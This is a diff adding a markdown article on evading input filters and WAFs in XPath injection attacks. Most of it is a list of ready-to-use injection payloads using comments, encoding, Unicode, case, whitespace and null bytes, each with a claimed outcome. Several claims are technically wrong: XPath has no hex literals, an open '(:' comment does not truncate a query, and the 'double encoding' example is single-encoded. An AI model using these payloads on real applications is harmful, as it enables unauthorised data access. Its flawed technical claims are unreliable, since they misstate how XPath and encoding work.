@@ -1,0 +1,102 @@
+---
+title: 'XPath Injection Evasion Techniques: Strategies & Tools'
+description: Explore strategies for bypassing filters & WAFs in XPath injection attacks
+  using evasion techniques with examples.
+keywords:
+- XPath injection
+- evasion techniques
+- filter bypass
+- WAF bypass
+- payload obfuscation
+- comment encoding
+- hex encoding
+- case manipulation
+---
+
+# Evasion Techniques
+
+## Context
+
+    This article focuses on operational evasion techniques used to bypass input validation filters and Web Application Firewalls (WAFs) during XPath injection attacks. The reader is expected to understand XPath syntax and query structures, XML document layouts, and web application architectures. Familiarity with basic XPath injection methods, node and attribute traversal, and XPath function exploitation is assumed.
+
+## Theory
+
+### Filter and WAF Evasion in XPath Injection
+
+    Evasion techniques are designed to manipulate payloads in such a way that they bypass input validation filters or WAFs during an XPath injection attack. These measures are crucial because filters and WAFs often block known malicious patterns. Effective obfuscation can help bypass these controls. Vulnerabilities arise when input validation and filtering are incomplete, allowing carefully crafted payloads to pass through unnoticed.
+
+### Encoding and Obfuscation Strategies
+
+    Encoding and obfuscation tactics involve altering the appearance of payloads without changing their underlying logic. This strategy is employed to evade pattern-based detection systems. Attackers may encode, substitute, or manipulate payload characters to bypass filters and subsequently execute an injection.
+
+## Practice
+
+### Bypassing Filters with XPath Comment Encoding
+
+    - Payload:
+        ```http
+        ' or 1=1 (:
+        ```
+    - Outcome: the inserted comment truncates the remaining query, evading simple pattern filters.
+
+### Hex Encoding of XPath Payloads
+
+    - Payload:
+        ```http
+        ' or 0x31=0x31 or 'a'='
+        ```
+    - Outcome: numeric literals represented as hex bypass filters that only look for standard digits.
+
+### Unicode Normalization Bypass
+
+    - Payload:
+        ```http
+        ' or 1＝1 or 'a'='
+        ```
+    - Outcome: nonstandard Unicode operators slip past equality filters that expect ASCII characters.
+
+### Double Encoding in XPath Injection
+
+    - Payload:
+        ```http
+        %27%20or%201%3D1%20or%20%27a%27%3D%27
+        ```
+    - Outcome: filters performing a single decode miss the malicious content hidden behind double encoding.
+
+### Case Manipulation in XPath Keywords
+
+    - Payload:
+        ```http
+        ' Or 1=1 Or 'a'='
+        ```
+    - Outcome: case-sensitive filters fail to match the mixed-case keywords, allowing execution.
+
+### Whitespace Injection and Obfuscation
+
+    - Payload:
+        ```http
+        '\tor\t1=1\tor\t'a'='
+        ```
+    - Outcome: tab-delimited operators bypass filters that only trim or inspect spaces.
+
+### Character Substitution in XPath Operators
+
+    - Payload:
+        ```http
+        ' or 1!=2 or 'a'='
+        ```
+    - Outcome: inequality operators slip through filters targeting `=`.
+
+### Null Byte Injection in XPath Payloads
+
+    - Payload:
+        ```http
+        ' or 1=1 or 'a'='\u0000
+        ```
+    - Outcome: filters stop processing at the null byte while the backend query still evaluates the injected logic.
+
+## Tools
+
+    - **Burp Suite**
+    - **OWASP ZAP**
+    - **curl**
